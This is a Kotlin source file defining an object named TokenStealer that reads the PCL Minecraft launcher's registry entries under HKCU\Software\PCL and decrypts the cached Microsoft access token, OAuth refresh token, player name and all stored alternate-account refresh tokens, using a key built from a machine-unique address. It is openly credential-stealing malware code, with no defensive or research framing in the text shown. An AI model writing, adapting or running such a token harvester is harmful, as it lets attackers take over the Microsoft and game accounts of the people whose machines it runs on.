package rip.pclauncher.decryptor

import com.google.gson.Gson
import com.google.gson.JsonObject
import com.sun.jna.platform.win32.Advapi32Util
import com.sun.jna.platform.win32.WinReg

object TokenStealer {
    val DECRYPT_KEY = "PCL${ModSecret.secretGetUniqueAddress()}"

    val ACCESS_TOKEN = "CacheMsAccess"
    val IN_GAME_NAME = "CacheMsName"
    val REFRESH_TOKEN = "CacheMsOAuthRefresh"

    val ALTS_REFRESH_TOKENS = "LoginMsJson"

    fun getRefreshToken(): String {
        val token = getValue(REFRESH_TOKEN)
        return decrypt(token)
    }

    fun getAccessToken(): String {
        val token = getValue(ACCESS_TOKEN)
        return decrypt(token)
    }

    fun getIGN(): String {
        val ign = getValue(IN_GAME_NAME)
        return decrypt(ign)
    }

    fun getAllAccounts(): List<Account> {
        val accounts = getValue(ALTS_REFRESH_TOKENS)
        val decrypted = decrypt(accounts)

        val json = Gson().fromJson(decrypted, JsonObject::class.java)
        val pairs = json.entrySet().map {
            Account(it.key, it.value.asString)
        }

        return pairs
    }

    private fun decrypt(value: String): String {
        return ModSecret.secretDecrypt(value, DECRYPT_KEY)
    }

    fun getValue(key: String): String {
        return Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\PCL", key)
    }
}